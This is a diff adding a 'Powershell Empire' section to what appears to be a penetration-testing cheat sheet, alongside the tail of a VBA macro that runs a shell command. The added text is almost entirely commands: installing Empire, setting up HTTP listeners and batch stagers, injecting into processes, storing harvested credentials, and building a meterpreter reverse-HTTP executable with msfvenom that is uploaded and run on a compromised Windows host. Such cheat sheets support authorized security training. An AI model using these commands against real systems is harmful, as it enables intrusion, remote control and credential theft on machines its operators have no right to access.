@@ -41,6 +41,7 @@
 38. [AV Evasion](#AV-Evasion)
 39. [Port Redirection and Tunneling](#Port-Redirection-and-Tunneling)
 40. [Client Side Attacks](#Client-Side-Attacks)
+41. [Powershell Empire](#Powershell-Empire)
 
 <sub><sup>:warning: For educational purposes only! Do not run any of the commantds on a network or hardware that you do not own!</sup></sub>
 
@@ -2808,5 +2809,68 @@ Sub MyMacro()
     CreateObject("Wscript.Shell").Run Str
 End Sub
 ```
+
+# Powershell Empire
+PowerShell empire is a post-exploitation agent. Empire implements the ability to run PowerShell agents without needing powershell.exe, modules ranging from keyloggers to Mimikatz, and adaptable communications to evade network detection. This is all bundled into a framework which is publicly available on GitHub.
+
+## Installation
+```
+sudo git clone https://github.com/PowerShellEmpire/Empire.git
+cd Empire
+sudo ./setup/install.sh
+```
+## Sample Commands
+```
+listeners
+uselistener http # use tab (autocompletion) to get a list of available listeners
+info
+set Host 10.10.10.10
+execute
+back
+usestager windows/launcher_bat
+set Listener http
+execute
+
+agents
+interact <Name> 
+
+creds
+creds add domain.com user pass!
+```
+
+## Migrate to another process
+```
+interact XYZXYZXY
+ps
+psinject http 3568
+agents
+interact ABCABCAB
+```
+
+## Modules
+```
+usemodule # use tab (autocompletion) to get a list of available listeners
+```
+
+## Switch between Empire and Metasploit
+```
+$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.10.10 LPORT=4444 -f exe -o exe.exe
+# setup multi handler listener
+Empire: SY24XF0J) > upload exe.exe
+Empire: SY24XF0J) > shell dir
+Empire: SY24XF0J) > shell C:\Users\user\Downloads\exe.exe
+
+```
+Other way
+```
+Empire: SY24XF0J) > usestager windows/launcher_bat
+Empire: SY24XF0J) > set Listener http
+Empire: SY24XF0J) > execute
+meterpreter> upload launcher.bat
+```
+
+
+
+
 
 
